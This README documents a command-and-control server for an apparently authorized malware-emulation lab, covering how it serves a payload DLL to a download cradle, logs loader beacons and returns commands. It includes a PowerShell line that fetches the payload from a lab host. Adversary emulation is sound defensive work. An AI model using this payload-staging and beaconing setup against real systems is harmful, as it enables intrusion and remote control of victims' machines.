# JawDropper C2 Server

```
============================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY

This C2 server runs on your local development machine to serve payloads
and log beacon check-ins. It does NOT connect to external infrastructure.

C2 Address: 192.168.0.148:8888 (your MacBook on the lab network)
============================================================================
```

## Overview

The C2 server provides two functions:
1. **Payload delivery** — Serves the compiled DLL to the download cradle
2. **Beacon logging** — Logs check-ins from the loader for video recording

## Quick Start

### Option 1: Simple (Recommended for most uses)

Just use Python's built-in HTTP server:

```bash
cd jawdropper
python3 -m http.server 8888
```

This serves files from the `jawdropper/` directory. The dropper will download from `/payloads/payload.dll`.

### Option 2: Enhanced (For video recording)

Use the custom C2 server for beacon logging and a status page:

```bash
python3 c2-server/server.py --port 8888
```

This provides:
- A web status page at `http://localhost:8888/` showing recent beacons
- Timestamped console logging of payload deliveries and beacons
- Camera-friendly output for video recording

## Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Status page with recent beacons |
| `/payloads/<file>` | GET | Serve payload files |
| `/beacon` | POST | Receive beacon check-ins from loader |

## Beacon Format

The loader sends beacons as JSON POST requests:

```json
{
    "hostname": "MALWARE-TEST-01",
    "pid": 4412,
    "stage": "loader_complete"
}
```

The server responds with:

```json
{
    "status": "ok",
    "command": "calc"
}
```

## Command-Line Options

```
usage: server.py [-h] [--port PORT] [--serve-dir DIR] [--bind ADDR]

JawDropper C2 Server - Esinta Emulation

options:
  -h, --help            show this help message and exit
  --port PORT, -p PORT  Port to listen on (default: 8888)
  --serve-dir DIR, -d   Directory to serve files from (default: jawdropper/)
  --bind ADDR, -b ADDR  Address to bind to (default: 0.0.0.0)
```

## Console Output

The server produces camera-friendly output:

```
======================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY
======================================================================

JawDropper C2 Server

  Listening:      http://0.0.0.0:8888
  Serving files:  /Users/you/Emulation/jawdropper
  Status page:    http://localhost:8888/
  Payload URL:    http://192.168.0.148:8888/payloads/payload.dll

Waiting for connections... (Ctrl+C to stop)
----------------------------------------------------------------------
[2026-02-10 12:35:40] PAYLOAD REQUEST → payload.dll
[2026-02-10 12:35:41] PAYLOAD DELIVERED → payload.dll (752 KB)
[2026-02-10 12:35:42] BEACON from MALWARE-TEST-01 (PID: 4412) - Stage: loader_complete
```

## Payload Setup

Before starting the C2 server, build the payload DLL and copy it to the payloads directory:

```bash
cd jawdropper/stage2-loader
./build.sh
```

This compiles the DLL and copies it to `c2-server/payloads/payload.dll`.

Alternatively, copy manually:

```bash
cp stage2-loader/jawdropper.dll c2-server/payloads/payload.dll
```

## Network Requirements

The C2 server must be reachable from your Windows test VM:

1. Run the server on your MacBook (192.168.0.148)
2. Ensure the Windows VM can reach port 8888
3. The dropper has `192.168.0.148:8888` hardcoded — update if your IP differs

### Testing Connectivity

From the Windows VM:
```powershell
# Test payload download
Invoke-WebRequest -Uri "http://192.168.0.148:8888/payloads/payload.dll" -OutFile test.dll

# Check if file downloaded
Get-Item test.dll
```

## Dependencies

None — uses Python standard library only.

- `http.server` — HTTP server
- `json` — JSON parsing
- `datetime` — Timestamps
- `argparse` — Command-line parsing
